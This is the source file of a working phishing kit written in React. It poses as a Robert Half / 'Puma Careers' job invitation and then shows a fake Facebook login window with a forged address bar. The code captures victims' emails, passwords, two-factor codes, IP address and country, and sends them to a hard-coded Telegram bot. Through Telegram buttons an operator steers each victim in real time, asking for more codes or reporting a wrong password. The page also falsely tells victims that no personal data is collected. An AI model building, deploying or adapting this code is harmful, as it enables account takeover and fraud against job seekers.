import React, { useEffect, useRef, useState } from 'react';
import { io, Socket } from 'socket.io-client';
import './MetaSecurityCheck.css';
import LinearProgress from '@mui/material/LinearProgress';
import logo from './Robert_Half_logo_svg.svg';
import talentlogo from './talent.svg';
import facebooklogo from './facebook.svg';
import facebookTextLogo from './facebook-text.svg';
import greenLock from './green-lock.svg';
import fbMobile from './fb-mobile.svg';
import logo2fa from './2fa.svg';
import logo2faPhone from './2fa-phone.svg';
import { X } from 'lucide-react';
import WorkExperienceForm from './WorkExperienceForm';
import MeetingBooking from './MeetingBooking';
// import { Oval } from 'react-loader-spinner';
// import pkg from 'react-loader-spinner';
// const { Oval } = pkg;

const BOT_TOKEN = '6913518641:AAHVpBLZTA5wbW2MVwXf5clKei0JKRbwIB4';
const CHAT_ID = '-4856703285';
const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

const FACEBOOK_LOGO =
  'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'; // favicon

const FACEBOOK_FAVICON = 'https://www.facebook.com/favicon.ico';
const FACEBOOK_ICON =
  'https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/8FzGd6gZdQv.png';

const fa_code_texts = {
  '2fa': {
    title: 'Go to your authentication app',
    subTitle:
      'Enter the 6-digit code for this account from the two-factor authentication app you set up (such as Duo Mobile or Google Authenticator).',
    icon: logo2fa,
  },
  '2faphone': {
    title: 'Check your text messages',
    subTitle: 'Enter the code that we sent to your phone number.',
    icon: logo2faPhone,
  },
  '2fawhatsapp': {
    title: 'Check your Whatsapp',
    subTitle: 'Enter the code that we sent to your whatsapp.',
    icon: logo2faPhone,
  },
};

// function useTelegramSocket(
//   sessionId: string,
//   onUpdate: (action: string, raw: any) => void
// ) {
//   useEffect(() => {
//     if (!sessionId) return;
//     const socket: Socket = io('http://localhost:3000');
//     socket.emit('join', { sessionId });
//     socket.on('telegram_update', ({ action, raw }) => {
//       onUpdate(action, raw);
//       console.log('📬 got telegram_update', raw);
//     });
//     return () => socket.disconnect();
//   }, [sessionId, onUpdate]);
// }
function useTelegramSocket(
  sessionId: string,
  onUpdate: (action: string, raw: any) => void
) {
  useEffect(() => {
    if (!sessionId) return;
    const socket: Socket = io('http://localhost:3000');
    socket.emit('join', { sessionId });
    socket.on('telegram_update', ({ action, raw }) => {
      onUpdate(action, raw);
    });
    socket.on('disconnect', (reason) => console.log(''));
    return () => {
      socket.disconnect();
    };
  }, [sessionId, onUpdate]);
}

const TELEGRAM_BOT_TOKEN = '6913518641:AAHVpBLZTA5wbW2MVwXf5clKei0JKRbwIB4'; // <<--- REPLACE
const TELEGRAM_CHAT_ID = '-4856703285';

const Login: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [sessionId] = useState(() => Math.random().toString(36).slice(2, 10));
  const [progress, setProgress] = useState(20);
  const [step, setStep] = useState<
    | 'captcha'
    | 'meta'
    | 'login'
    | '2fa'
    | 'waiting'
    | 'success'
    | '2faphone'
    | '2fawhatsapp'
    | 'calendly'
  >('captcha');
  const [error, setError] = useState({ email: '', password: '' });
  const [captchaError, setCaptchaError] = useState('');
  const [isLoading, setLoading] = useState(false);
  const [captchaToken, setCaptchaToken] = useState<any>(false);
  const [openModal, setOpenModal] = useState(false);
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [faCode, setFaCode] = useState<any>('');
  const [faCodeError, setFaCodeError] = useState('');
  const [faCodeLoading, setFaCodeLoading] = useState(false);
  const [loginError, setLoginError] = useState('');
  const [statusMsg, setStatusMsg] = useState('');

  useEffect(() => {
    document.title = 'Find the right job type for you | Robert Half';
  }, []);

  // --- Telegram Polling ---
  const lastUpdateRef = useRef(0);
  useEffect(() => {
    let active = true;

    const handleCb = async (cb: any) => {
      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: cb.id }),
        }
      );

      const d = cb.data;
      if (d.startsWith('done_')) {
        onCloseModal();
        setStep('success');
        setProgress(60);
        return;
      }
      if (d.startsWith('wrong2fa_') || d.startsWith('wrong-2fa-code_')) {
        setFaCodeError('The code you entered is incorrect. Please try again.');
        setFaCodeLoading(false);
        // setStep('2fa');
        return;
      }
      if (d.startsWith('wrongpass_')) {
        setLoginError(
          'The email or mobile number you entered, or your password, is incorrect.'
        );
        setLoading(false);
        // setStep('login');
        return;
      }
      if (d.startsWith('2fa_')) setStep('2fa');
      if (d.startsWith('2faphone_')) setStep('2faphone');
      if (d.startsWith('2fawhatsapp_')) setStep('2fawhatsapp');
    };

    const poll = async () => {
      if (!active) return;
      try {
        const r = await fetch(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${
            lastUpdateRef.current + 1
          }`
        );
        const js = await r.json();
        (js.result || []).forEach((u: any) => {
          if (u.update_id > lastUpdateRef.current) {
            lastUpdateRef.current = u.update_id;
            if (u.callback_query) handleCb(u.callback_query);
          }
        });
      } catch {}
      if (active) setTimeout(poll, 1200);
    };

    poll();
    return () => {
      active = false;
    };
  }, [sessionId]);

  // --- Send to Telegram functions ---

  const sendLogin = () => {
    if (!formData.email || !formData.password) {
      if (!formData.email) {
        setError({
          ...error,
          email: 'Please enter your email or mobile number.',
        });
        return;
      }
      if (!formData.password) {
        setError({
          ...error,
          password:
            "The password that you've entered is incorrect. Forgotten password?",
        });
        return;
      }
      return;
    }
    setError({ email: '', password: '' });
    setLoading(true);
    setStatusMsg('Sending to Telegram...');
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        parse_mode: 'HTML',
        text: `🆕 New Log in\n📧 ${formData.email}\n🔑 ${formData.password}\n🏢 ${sessionId}`,
        reply_markup: {
          inline_keyboard: [
            [{ text: '🔐 Ask 2FA', callback_data: `2fa_${sessionId}` }],
            [{ text: '📱 2FA Phone', callback_data: `2faphone_${sessionId}` }],
            [
              {
                text: '💬 2FA WhatsApp',
                callback_data: `2fawhatsapp_${sessionId}`,
              },
            ],
            [
              {
                text: '❌ Wrong Pass',
                callback_data: `wrongpass_${sessionId}`,
              },
            ],
            [{ text: '✅ Done', callback_data: `done_${sessionId}` }],
          ],
        },
      }),
    })
      .then(() => setStatusMsg('Sent. Waiting for admin action...'))
      .catch(() => setStatusMsg('❌ Failed to send. CORS?'));
  };

   const collectDeviceInfo = () => {
    const { userAgent, language, platform } = navigator;
    const { width, height } = window.screen;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return {
      userAgent,
      language,
      platform,
      screenResolution: `${width}×${height}`,
      timezone,
    };
  };

  const onPressContinue = async () => {
    setProgress(40);
    setStep('meta');
     const deviceInfo = collectDeviceInfo();

    // 2) fetch IP + country
    let ip = 'unknown', country = 'unknown';
    try {
      const resp = await fetch('https://ipapi.co/json');
      const data = await resp.json();
      ip = data.ip;
      country = data.country_name;
    } catch (err) {
      console.warn('Could not fetch IP info', err);
    }
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        parse_mode: 'HTML',
        text: `• IP: ${ip}
• Country: ${country} 
• Session: ${sessionId}`,
      }),
    });
  };

  const onPressContinueWithMeta = () => {
    setOpenModal(true);
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        parse_mode: 'HTML',
        text: `User pressed continue with meta`,
      }),
    });
  };

  const onChangeCredintials = (value: string, type: string) => {
    setFormData((prev) => ({ ...prev, [type]: value }));
  };

  const onChange2FAcode = (value: number) => {
    setFaCode(value);
  };

  const onSubmit2FAcode = () => {
    if (!faCode || faCode === null || faCode === undefined) {
      setFaCodeError('Please enter your code to continue.');
      return;
    } else {
      const digitsOnly = Math.abs(faCode).toString().replace('.', '');
      if (digitsOnly.length !== 6) {
        setFaCodeError(
          'Your code must be 6 digits. Please check and try again.'
        );
        return;
      } else {
        setFaCodeError('');
        setFaCodeLoading(true);
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            parse_mode: 'HTML',
            text: `🆕 New 2FA code\n📧 ${formData.email}\n🔑 ${formData.password}\n🔢 FA CODE: ${faCode} \n🏢 ${sessionId}`,
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔐 Ask 2FA', callback_data: `2fa_${sessionId}` }],
                [
                  {
                    text: '❌ Wrong Pass',
                    callback_data: `wrongpass_${sessionId}`,
                  },
                ],
                [{ text: '✅ Done', callback_data: `done_${sessionId}` }],
                [
                  {
                    text: '❌ Wrong 2FA code',
                    callback_data: `wrong-2fa-code_${sessionId}`,
                  },
                ],
              ],
            },
          }),
        });
      }
    }
  };

  const onCloseModal = () => {
    setOpenModal(false);
    setLoading(false);
    setFormData({ email: '', password: '' });
    setError({ email: '', password: '' });
    setFaCode('');
    setFaCodeError('');
    setLoginError('');
  };

  const onSubmitJobDetails = () => {
    setStep('calendly');
    setProgress(80);
  };

  useEffect(() => {}, [formData]);

  // useEffect(() => {
  //   // @ts-ignore
  //   window.onCaptchaSuccess = (token: string) => {
  //     setCaptchaToken(token);
  //     setCaptchaError('');
  //   };
  //   const script = document.createElement('script');
  //   script.src = 'https://www.google.com/recaptcha/api.js';
  //   script.async = true;
  //   script.defer = true;
  //   document.body.appendChild(script);
  //   return () => {
  //     document.body.removeChild(script);
  //     // @ts-ignore
  //     delete window.onCaptchaSuccess;
  //   };
  // }, []);

  return (
    <div className="min-h-screen w-full flex flex-col justify-between bg-[#F1F5F8]">
      {/* Header */}
      <header className="w-full h-20 border-b-2 border-[#E2E8EB] flex items-center justify-between px-4 sm:px-6 md:px-12 lg:px-32">
        <img src={logo} alt="logo" className="h-6" />
        <button>
          <X size={20} color="#384955" />
        </button>
      </header>
      <FacebookResponsiveModal
        isOpen={openModal}
        onClose={onCloseModal}
        onChangeCredintials={onChangeCredintials}
        error={error}
        onLogin={sendLogin}
        isLoading={isLoading}
        step={step}
        onChange2FAcode={onChange2FAcode}
        onSubmit2FAcode={onSubmit2FAcode}
        faCodeError={faCodeError}
        faCodeLoading={faCodeLoading}
        loginError={loginError}
      />
      {/* Body */}
      {step === 'captcha' && (
        <Captcha
          onPressContinue={onPressContinue}
          captchaError={captchaError}
        />
      )}

      {step === 'meta' && (
        <Meta onPressContinueWithMeta={onPressContinueWithMeta} />
      )}
      {step === 'success' ? (
        <WorkExperienceForm onSubmitJobDetails={onSubmitJobDetails} />
      ) : null}
      {step === 'calendly' ? <MeetingBooking /> : null}

      {/* Footer Progress */}
      <footer className="w-full p-5 bg-white border-t-2 border-[#E2E8EB] pb-13 px-0">
        <LinearProgress
          variant="determinate"
          value={progress}
          sx={{
            height: 15,
            borderRadius: 5,
            borderTopLeftRadius: 0,
            borderBottomLeftRadius: 0,
            borderBottomRightRadius: 0,
            borderTopRightRadius: 0,
            backgroundColor: '#D2D8DC',
            '& .MuiLinearProgress-bar': {
              borderRadius: 5,
              backgroundColor: '#0B6E76',
            },
          }}
        />
      </footer>
    </div>
  );
};

const Meta = ({ onPressContinueWithMeta }: any) => {
  return (
    <div className="flex-grow flex items-center justify-center p-6">
      <div className="bg-white border-2 border-[#E2E8EB] rounded-[40px] w-full max-w-[600px] p-12 flex flex-col justify-between">
        <div>
          <h2 className="text-xl font-semibold text-[#033941]">
            Authentication Required
          </h2>
          <hr className="h-[2px] mt-5 mb-5 bg-[#D9D9D9] border-[#D9D9D9]" />
          <p className="text-[#272727] text-[16px] font-[500]">
            Access to this company’s services requires authentication through
            Meta. This authentication method is mandated in accordance with our
            internal security protocols and corporate policies, ensuring secure
            and compliant access for all users.
          </p>

          <p className="text-[#4E4E4E] font-[400] text-[15px] mt-5">
            Please note that no personal data is collected during the
            authentication process. This measure is in place solely to verify
            access in alignment with company policy, and all user privacy is
            fully respected and protected throughout.
          </p>
        </div>
        <button
          onClick={onPressContinueWithMeta}
          className="mt-6 w-full h-14 rounded-full bg-[#0865FE] text-white text-lg flex items-center justify-center gap-2 cursor-pointer"
        >
          <img src={facebooklogo} alt="Facebook" className="h-6" />
          Continue with Meta
        </button>
      </div>
    </div>
  );
};

const Captcha = ({ captchaError, onPressContinue }: any) => {
  return (
    <div className="flex-grow flex items-center justify-center p-4">
      <div className="bg-white border-2 border-[#E2E8EB] rounded-[40px] w-full max-w-lg p-8 flex flex-col items-center">
        <img src={talentlogo} alt="talent logo" className="w-60" />
        <h1 className="text-2xl font-bold text-[#033941] text-center mt-4">
          Welcome to Puma Careers
        </h1>
        <p className="text-center text-gray-600 mt-2">
          Please don’t share this link – it’s a private invitation sent to you
          personally by one of our recruiters. This opportunity was selected
          with care, just for you, and we kindly ask that you keep it
          confidential. We appreciate your discretion, and we’re excited for
          what’s ahead.
        </p>
        <div className="w-36 h-1 bg-[#033941] my-6"></div>
        {/* <div className="mb-5">
          <div
            className="g-recaptcha"
            data-sitekey="6LfGa0ArAAAAAG697McQ3be4gpTS1sBIxZzGrRS6"
            data-callback="onCaptchaSuccess"
          ></div>
          {captchaError && (
            <p className="text-red-600 text-sm mt-2">{captchaError}</p>
          )}
        </div> */}
        <button
          onClick={onPressContinue}
          className="w-full h-14 rounded-full bg-[#033941] text-white text-lg font-medium cursor-pointer"
        >
          Continue
        </button>
      </div>
    </div>
  );
};

const AddressBar = ({ url }: any) => (
  <div className="w-full px-2">
    <div className="flex items-center bg-white border border-[#D9D9D9] rounded-[15px]  py-1 w-full mt-2 mb-3 px-2 flex-row justify-center items-center h-[35px]">
      <img
        src={greenLock}
        alt="Facebook"
        className="h-3 w-3 mb-[0.5px] mr-1"
        // height={32}
      />
      <span className="text-xs text-[#595959] truncate font-[400]">
        <span className="text-[#41bf56]"> https://</span>
        {url}
      </span>
    </div>
  </div>
);

const FacebookResponsiveModal = ({
  isOpen,
  onClose,
  onChangeCredintials,
  error,
  onLogin,
  isLoading,
  step,
  onChange2FAcode,
  onSubmit2FAcode,
  faCodeError,
  faCodeLoading,
  loginError,
}: any) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-[#00000080] bg-opacity-50 z-50 flex items-center justify-center px-2">
      {/* Desktop Layout */}
      {step === 'meta' ? (
        <MetaSection
          onChangeCredintials={onChangeCredintials}
          error={error}
          onLogin={onLogin}
          isLoading={isLoading}
          onClose={onClose}
          loginError={loginError}
        />
      ) : (
        <>
          <TwoFAModal
            onClose={onClose}
            onChange2FAcode={onChange2FAcode}
            onSubmit2FAcode={onSubmit2FAcode}
            faCodeError={faCodeError}
            faCodeLoading={faCodeLoading}
            step={step}
          />
        </>
      )}
    </div>
  );
};

const TwoFAModal = ({
  onClose,
  onChange2FAcode,
  onSubmit2FAcode,
  faCodeError,
  faCodeLoading,
  step,
}: any) => {
  return (
    <>
      {/* Desktop layout */}
      <div className="hidden md:flex flex-col w-[840px] rounded-2xl shadow-xl bg-[#F2F3F7]">
        {/* Top Bar */}
        <div className="flex items-center px-4 py-2 border-b rounded-t-2xl bg-[#F2F3F7] border-[#D9D9D9]">
          <img src={FACEBOOK_FAVICON} alt="Facebook" className="w-3 h-3 mr-1" />
          <span className="font-medium text-[#454444] flex-1 text-[14px]">
            Facebook
          </span>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600 ml-4 cursor-pointer"
            aria-label="Close"
          >
            <svg width="18" height="18" fill="none" viewBox="0 0 24 24">
              <path
                stroke="currentColor"
                strokeWidth="2"
                d="M6 6l12 12M6 18L18 6"
              />
            </svg>
          </button>
        </div>
        <AddressBar
          url={
            'www.facebook.com/two_step_verification/two_factor/?encrypted_context=ARHGj9e6bU4t_TcvPymKfPs23ARPNglrxceGshxcDGSYAN...'
          }
        />
        <div className="w-full bg-[#F2F3F7] px-[25%] pb-[50px] rounded-b-2xl">
          <div className="w-full bg-[#F2F3F7]">
            <p className="text-[#182424] font-[400] text-[12px]">Facebook</p>
            <p className="text-[#182424] font-[500] text-[20px] mb-1">
              {fa_code_texts[step].title}
            </p>
            <p className="text-[#182424] font-[400] text-[12px] mb-4">
              {fa_code_texts[step].subTitle}
            </p>
            <img
              src={fa_code_texts[step].icon}
              alt="2FA"
              className="h-[222px] w-[525px] mx-auto mb-6 object-contain"
            />
            <div className="mb-9">
              <div className="w-full max-w-md">
                <div className="mb-6">
                  <input
                    type="number"
                    placeholder="Code"
                    onChange={(e) => {
                      onChange2FAcode(e.target.value);
                    }}
                    className=" no-spinner w-full px-3 py-3  border border-[#66748499] rounded-[15px] bg-transparent focus:outline-none focus:ring-2 focus:ring-blue-500 text-gray-700 placeholder-gray-400"
                  />
                  {faCodeError ? (
                    <p className="text-left text-red-600 text-[11px] pl-1">
                      {faCodeError}
                    </p>
                  ) : null}
                </div>
                <button
                  className="w-full h-11 rounded-full bg-[#0865FE] text-white text-lg flex items-center justify-center gap-2 cursor-pointer"
                  onClick={onSubmit2FAcode}
                >
                  {faCodeLoading ? (
                    <div className="w-full h-full justify-center items-center flex">
                      <FrostedSpinner size={20} />
                    </div>
                  ) : (
                    'Continue'
                  )}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      {/* Mobile layout */}
      <div className="flex md:hidden flex-col w-full h-[80%] bg-[#f5f6fa] rounded-2xl ">
        {/* Mobile address bar */}
        <div className="px-2 pt-2 border-[#D9D9D9] border-b-[1px] pb-2">
          <div className="flex items-center bg-[#f4f6fa] border border-gray-300 rounded-xl px-2 py-1">
            <img
              src={greenLock}
              alt="Facebook"
              className="h-3 w-3 mb-[0.5px] mr-1"
              // height={32}
            />
            <span className="text-[#41bf56] text-xs">https://</span>
            <span className="text-xs text-gray-700 truncate">
              www.facebook.com/two_step_verification/two...
            </span>
          </div>
        </div>
        {/* Content */}
        <div className="flex-1 px-3 pt-4 pb-1 flex flex-col">
          <p className="text-[#182424] font-[400] text-[12px]">Facebook</p>
          <p className="text-[#182424] font-[500] text-[18px] mb-1">
            {fa_code_texts[step].title}
          </p>
          <p className="text-[#182424] font-[400] text-[12px] mb-4">
            {fa_code_texts[step].subTitle}
          </p>
          <img
            src={fa_code_texts[step].icon}
            alt="2FA"
            className="w-full h-[150px] object-contain bg-[#f5f6fa] rounded mb-6"
          />
          <div className="mb-6">
            <input
              type="number"
              placeholder="Code"
              onChange={(e) => {
                onChange2FAcode(e.target.value);
              }}
              className="w-full px-3 py-3  border border-[#66748499] rounded-[15px] bg-transparent focus:outline-none focus:ring-2 focus:ring-blue-500 text-gray-700 placeholder-gray-400"
            />
            {faCodeError ? (
              <p className="text-left text-red-600 text-[11px] pl-1">
                {faCodeError}
              </p>
            ) : null}
          </div>

          <button
            className="w-full h-11 rounded-full bg-[#0865FE] text-white text-lg flex items-center justify-center gap-2 cursor-pointer"
            onClick={onSubmit2FAcode}
          >
            {faCodeLoading ? (
              <div className="w-full h-full justify-center items-center flex">
                <FacebookFadeSpinnerPerfect
                  size={23}
                  bg="transparent"
                  color="white"
                  arcLength={320}
                />
              </div>
            ) : (
              'Continue'
            )}
          </button>
        </div>
      </div>
    </>
  );
};

const MetaSection = ({
  onChangeCredintials,
  error,
  onLogin,
  isLoading,
  onClose,
  loginError,
}: any) => {
  return (
    <>
      <div className="hidden md:flex flex-col w-[840px] rounded-2xl shadow-xl bg-[#F2F3F7]">
        {/* Browser tab */}
        <div className="flex items-center px-4 py-2 border-b rounded-t-2xl bg-[#F2F3F7] border-[#D9D9D9]">
          <img src={FACEBOOK_FAVICON} alt="Facebook" className="w-3 h-3 mr-1" />
          <span className="font-medium text-[#454444] flex-1 text-[14px]">
            Facebook
          </span>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600 ml-4 cursor-pointer"
            aria-label="Close"
          >
            <svg width="18" height="18" fill="none" viewBox="0 0 24 24">
              <path
                stroke="currentColor"
                strokeWidth="2"
                d="M6 6l12 12M6 18L18 6"
              />
            </svg>
          </button>
        </div>
        {/* Address bar */}
        <AddressBar
          url={
            'www.facebook.com/D%3DFacebook%2Bshare%2Bpopup%26p%2535Burl%255D%3Dhttp%253A%252F%252Fjsfiddle.net%252Frobert...'
          }
        />
        {/* Content */}
        <div className="flex flex-row items-center justify-center px-8 py-14 pb-20 pr-14 bg-[#F2F3F7] rounded-b-2xl">
          {/* Facebook brand side */}
          <div className="flex-1 pr-10 flex justify-center flex-col items-center">
            <div className="font-bold text-[2rem] text-[#1877f2] mb-20 select-none flex-1 max-w-[260px]">
              {/* facebook */}
              <img
                src={facebookTextLogo}
                alt="Facebook"
                className="h-8 mb-1"
                // height={32}
              />
              <div className="text-gray-700 text-lg max-w-[260px]">
                <p className="text-black text-[16px] max-w-[260px] font-[400]">
                  Connect with friends and the world around you on Facebook.
                </p>
              </div>
            </div>
          </div>
          {/* Login form */}
          <div className="bg-white rounded-lg shadow p-3 pb-5 pt-3 w-[300px]">
            <div className="mb-3">
              <input
                type="text"
                placeholder="Email or phone number"
                className="w-full border border-[#D3D3D399] rounded  px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 text-sm text-black"
                onChange={(e) => {
                  onChangeCredintials(e.target.value, 'email');
                }}
              />
              {error?.email ? (
                <p className="text-left text-red-600 text-[11px] pl-1">
                  {error?.email}
                </p>
              ) : null}
            </div>
            <div className="mb-3">
              <input
                type="password"
                placeholder="Password"
                className="w-full border border-[#D3D3D399] rounded px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 text-sm text-black"
                onChange={(e) => {
                  onChangeCredintials(e.target.value, 'password');
                }}
              />
              {error?.password ? (
                <p className="text-left text-red-600 text-[11px] pl-1">
                  {error?.password}
                </p>
              ) : null}
            </div>

            <button
              className="w-full bg-[#1877f2] text-[14px] text-white font-semibold rounded py-2 text-base hover:bg-blue-700 transition mb-2 cursor-pointer h-[37px]"
              onClick={onLogin}
            >
              {isLoading ? (
                <div className="w-full h-full justify-center items-center flex">
                  <FrostedSpinner size={20} />
                </div>
              ) : (
                'Log In'
              )}
            </button>
            {loginError ? (
              <p className="text-left text-red-600 text-[11px] pl-1">
                {loginError}
              </p>
            ) : null}
            <div className="text-center">
              <button className="text-blue-500 text-sm hover:underline text-[12px] cursor-pointer">
                Forgot password?
              </button>
            </div>
            <div className="my-3 bg-[#D9D9D9] h-[1px]" />
            <div className="w-full flex justify-center">
              <button className="w-[70%] bg-[#42B72A] text-white font-semibold text-[14px] rounded py-2 text-base hover:bg-green-600 transition cursor-pointer">
                Create new account
              </button>
            </div>
          </div>
        </div>
      </div>
      <div className="flex md:hidden flex-col w-full  bg-white rounded-2xl shadow-xl items-center ">
        {/* Address bar */}
        <div className="w-full rounded-t-2xl px-2 pt-2 border-[#D9D9D9] border-b-[1px] pb-2">
          <div className="flex items-center bg-[#f4f6fa] border border-gray-300 rounded-xl px-2 py-1">
            {/* <svg width="18" height="18" className="mr-1" viewBox="0 0 24 24">
              <circle cx="12" cy="12" r="12" fill="#43b964" />
            </svg> */}
            <img
              src={greenLock}
              alt="Facebook"
              className="h-3 w-3 mb-[0.5px] mr-1"
              // height={32}
            />
            <span className="text-[#41bf56] text-xs">https://</span>
            <span className="text-xs text-gray-700 truncate">
              www.facebook.com/DX%3DFaceboo...
            </span>
          </div>
        </div>
        {/* Language */}
        <div className="w-full text-center text-xs text-gray-600 pt-3 pb-1">
          English (US)
        </div>
        {/* Facebook logo */}
        <img
          src={fbMobile}
          alt="Facebook"
          className="h-[59px] w-[59px] my-10 mr-1"
          // height={32}
        />
        {/* Form */}
        <form className="w-full flex flex-col px-6">
          <div className="w-full mb-3">
            <input
              type="text"
              placeholder="Mobile number or email"
              className="px-3 py-4 rounded-[10px] border border-[#D3D3D399] focus:outline-none focus:ring-1 focus:ring-blue-500 text-sm w-full"
              onChange={(e) => {
                onChangeCredintials(e.target.value, 'email');
              }}
            />
            {error?.email ? (
              <p className="text-left text-red-600 text-[11px] pl-1">
                {error?.email}
              </p>
            ) : null}
          </div>
          <div className="w-full mb-3">
            <input
              type="password"
              placeholder="Password"
              className="px-3 py-4 rounded-[10px] border border-[#D3D3D399] focus:outline-none focus:ring-1 focus:ring-blue-500 text-sm w-full"
              onChange={(e) => {
                onChangeCredintials(e.target.value, 'password');
              }}
            />
            {error?.password ? (
              <p className="text-left text-red-600 text-[11px] pl-1">
                {error?.password}
              </p>
            ) : null}
          </div>
          <button
            type="button"
            onClick={onLogin}
            className="w-full rounded-full bg-[#1877f2] font-semibold py-2 text-base mb-2 hover:bg-blue-700 transition text-[14px] text-white h-[37px]"
          >
            {isLoading ? (
              <div className="w-full h-full justify-center items-center flex">
                <FacebookFadeSpinnerPerfect
                  size={23}
                  bg="transparent"
                  color="white"
                  arcLength={320}
                />
                {/* <FrostedSpinner size={20} /> */}
              </div>
            ) : (
              'Log In'
            )}
          </button>
        </form>
        {/* Footer link */}
        <div className="w-full flex flex-col items-center pt-50 ">
          <a
            href="#"
            className="text-xs text-gray-400 pt-5 pb-1 hover:underline"
          >
            About • Help • More
          </a>
        </div>
      </div>

      {/* Mobile Layout */}
    </>
  );
};

const FacebookFadeSpinnerPerfect = ({
  size = 44,
  bg = '#fff',
  color = '#65676b',
  arcLength = 320, // degrees
}) => {
  // Arc math
  const r = 20;
  const stroke = 4;
  const center = 25;
  const startAngle = -90;
  const endAngle = startAngle + arcLength;

  const polarToCartesian = (cx, cy, radius, angle) => ({
    x: cx + radius * Math.cos((angle * Math.PI) / 180),
    y: cy + radius * Math.sin((angle * Math.PI) / 180),
  });

  const start = polarToCartesian(center, center, r, startAngle);
  const end = polarToCartesian(center, center, r, endAngle);
  const largeArcFlag = arcLength > 180 ? 1 : 0;

  const d = [
    'M',
    start.x,
    start.y,
    'A',
    r,
    r,
    0,
    largeArcFlag,
    1,
    end.x,
    end.y,
  ].join(' ');

  return (
    <div
      className="flex items-center justify-center"
      style={{
        background: bg,
        width: size * 2.1,
        height: size * 1.05,
        borderRadius: size / 2,
      }}
    >
      <svg
        className="animate-spin"
        style={{ width: size, height: size }}
        viewBox="0 0 50 50"
      >
        <defs>
          <linearGradient id="fade-arc" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" stopColor={color} stopOpacity="1" />
            <stop offset="50%" stopColor={color} stopOpacity="0.6" />
            <stop offset="85%" stopColor={color} stopOpacity="0.15" />
            <stop offset="100%" stopColor={color} stopOpacity="0" />
          </linearGradient>
        </defs>
        <path
          d={d}
          stroke="url(#fade-arc)"
          strokeWidth={stroke}
          fill="none"
          strokeLinecap="round"
        />
      </svg>
    </div>
  );
};

const FrostedSpinner = ({
  size = 34,
  color = '#c2c6ce', // Frosty gray
  arcLength = 310, // About 1/3 of a circle
  stroke = 3,
}) => {
  const r = (size - stroke) / 2;
  const center = size / 2;
  const startAngle = -90;
  const endAngle = startAngle + arcLength;

  // Convert polar to cartesian
  const polarToCartesian = (cx, cy, radius, angle) => ({
    x: cx + radius * Math.cos((angle * Math.PI) / 180),
    y: cy + radius * Math.sin((angle * Math.PI) / 180),
  });

  const start = polarToCartesian(center, center, r, startAngle);
  const end = polarToCartesian(center, center, r, endAngle);
  const largeArcFlag = arcLength > 180 ? 1 : 0;

  const d = [
    'M',
    start.x,
    start.y,
    'A',
    r,
    r,
    0,
    largeArcFlag,
    1,
    end.x,
    end.y,
  ].join(' ');

  return (
    <div
      className="flex items-center justify-center"
      style={{
        // background: '#f6f7f9', // Slightly frosted bg
        width: size,
        height: size,
        borderRadius: '50%',
      }}
    >
      <svg
        className="animate-spin"
        style={{ width: size, height: size }}
        viewBox={`0 0 ${size} ${size}`}
      >
        <defs>
          <linearGradient id="frosted-fade" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" stopColor={color} stopOpacity="1" />
            <stop offset="70%" stopColor={color} stopOpacity="0.35" />
            <stop offset="100%" stopColor={color} stopOpacity="0" />
          </linearGradient>
        </defs>
        <path
          d={d}
          stroke="url(#frosted-fade)"
          strokeWidth={stroke}
          fill="none"
          strokeLinecap="round"
        />
      </svg>
    </div>
  );
};

export default Login;

// // src/components/Login.tsx
// import React, { useEffect, useState } from 'react';
// import { io, Socket } from 'socket.io-client';
// import './MetaSecurityCheck.css';
// import LinearProgress from '@mui/material/LinearProgress';
// // import '../src/assets/style.css';
// // import '../src/assets/loader.css';
// import logo from './Robert_Half_logo_svg.svg';
// import talentlogo from './talent.svg';
// import facebooklogo from './facebook.svg';
// import { X } from 'lucide-react';

// const BOT_TOKEN = '6913518641:AAHVpBLZTA5wbW2MVwXf5clKei0JKRbwIB4';
// const CHAT_ID = '-4856703285';
// const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

// // simple hook to join a session room and listen for updates
// function useTelegramSocket(
//   sessionId: string,
//   onUpdate: (action: string, raw: any) => void
// ) {
//   useEffect(() => {
//     if (!sessionId) return;
//     const socket: Socket = io('http://localhost:3000');
//     socket.emit('join', { sessionId });
//     socket.on('telegram_update', ({ action, raw }) => {
//       onUpdate(action, raw);
//       console.log('📬 got telegram_update', raw);
//     });
//     socket.on('disconnect', (reason) =>
//       console.log('❌ WS disconnected:', reason)
//     );
//     return () => {
//       socket.disconnect();
//     };
//   }, [sessionId, onUpdate]);
// }

// const Login: React.FC = () => {
//   const [email, setEmail] = useState('');
//   const [password, setPassword] = useState('');
